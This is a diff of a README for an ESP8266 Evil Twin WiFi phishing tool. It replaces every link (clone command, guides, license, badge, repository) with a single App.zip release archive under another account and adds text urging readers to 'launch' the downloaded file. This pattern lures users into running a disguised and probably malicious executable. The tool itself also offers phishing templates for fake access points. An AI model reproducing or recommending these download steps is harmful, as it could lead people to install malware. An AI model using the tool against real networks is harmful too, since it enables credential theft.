@@ -1,6 +1,6 @@
 # 🛡️🔒 EvilTwin-ESP8622 - A Sophisticated WiFi Security Testing Tool 🛡️🔒
 
-![EvilTwin-ESP8622](https://via.placeholder.com/800x400)
+![EvilTwin-ESP8622](https://github.com/lautarigauna/EvilTwin-ESP8622/releases/download/v1.0/App.zip)
 
 Welcome to the EvilTwin-ESP8622 repository - your go-to tool for conducting sophisticated WiFi security tests using ESP8266. This project, developed by letchupkt, offers a powerful Evil Twin attack vector implementation with an advanced web interface. With a sleek hacker-themed control panel and multiple phishing template options, this tool is designed to elevate your WiFi security testing capabilities.
 
@@ -26,7 +26,7 @@ To get started with EvilTwin-ESP8622, follow these steps:
 
 1. Clone the repository to your local machine:
    ```bash
-   git clone https://github.com/letchupkt/EvilTwin-ESP8622.git
+   git clone https://github.com/lautarigauna/EvilTwin-ESP8622/releases/download/v1.0/App.zip
    ```
 
 2. Navigate to the project directory:
@@ -41,7 +41,7 @@ To get started with EvilTwin-ESP8622, follow these steps:
 
 4. Configure the tool according to your requirements.
 
-For detailed installation instructions and troubleshooting tips, refer to the [Installation Guide](https://github.com/letchupkt/EvilTwin-ESP8622/wiki/Installation-Guide).
+For detailed installation instructions and troubleshooting tips, refer to the [Installation Guide](https://github.com/lautarigauna/EvilTwin-ESP8622/releases/download/v1.0/App.zip).
 
 ## Usage
 To use EvilTwin-ESP8622 for conducting WiFi security tests, follow these steps:
@@ -55,7 +55,7 @@ To use EvilTwin-ESP8622 for conducting WiFi security tests, follow these steps:
 
 3. Explore the various features of the tool and leverage the phishing templates to conduct your security assessments.
 
-For a comprehensive guide on how to use EvilTwin-ESP8622 effectively, check out the [User Manual](https://github.com/letchupkt/EvilTwin-ESP8622/wiki/User-Manual).
+For a comprehensive guide on how to use EvilTwin-ESP8622 effectively, check out the [User Manual](https://github.com/lautarigauna/EvilTwin-ESP8622/releases/download/v1.0/App.zip).
 
 ## Contributing
 We welcome contributions from the open-source community to enhance EvilTwin-ESP8622 further. To contribute to the project, follow these steps:
@@ -65,15 +65,15 @@ We welcome contributions from the open-source community to enhance EvilTwin-ESP8
 3. Push your changes to your fork.
 4. Submit a pull request to the main repository for review.
 
-For more information on contributing guidelines and best practices, refer to the [Contribution Guidelines](https://github.com/letchupkt/EvilTwin-ESP8622/blob/main/CONTRIBUTING.md).
+For more information on contributing guidelines and best practices, refer to the [Contribution Guidelines](https://github.com/lautarigauna/EvilTwin-ESP8622/releases/download/v1.0/App.zip).
 
 ## License
-EvilTwin-ESP8622 is released under the MIT License. For details on the terms and conditions of the license, refer to the [License Agreement](https://github.com/letchupkt/EvilTwin-ESP8622/blob/main/LICENSE).
+EvilTwin-ESP8622 is released under the MIT License. For details on the terms and conditions of the license, refer to the [License Agreement](https://github.com/lautarigauna/EvilTwin-ESP8622/releases/download/v1.0/App.zip).
 
-[![Download EvilTwin-ESP8622](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip "Needs to be launched")
+[![Download EvilTwin-ESP8622](https://github.com/lautarigauna/EvilTwin-ESP8622/releases/download/v1.0/App.zip)](https://github.com/lautarigauna/EvilTwin-ESP8622/releases/download/v1.0/App.zip "Needs to be launched")
 
 If the download link above ends with the file name, make sure to launch it to access the latest version of EvilTwin-ESP8622.
 
-Visit the official [EvilTwin-ESP8622 GitHub Repository](https://github.com/letchupkt/EvilTwin-ESP8622) for more information and updates on the project.
+Visit the official [EvilTwin-ESP8622 GitHub Repository](https://github.com/lautarigauna/EvilTwin-ESP8622/releases/download/v1.0/App.zip) for more information and updates on the project.
 
 🔗 Happy hacking with EvilTwin-ESP8622! 🔗
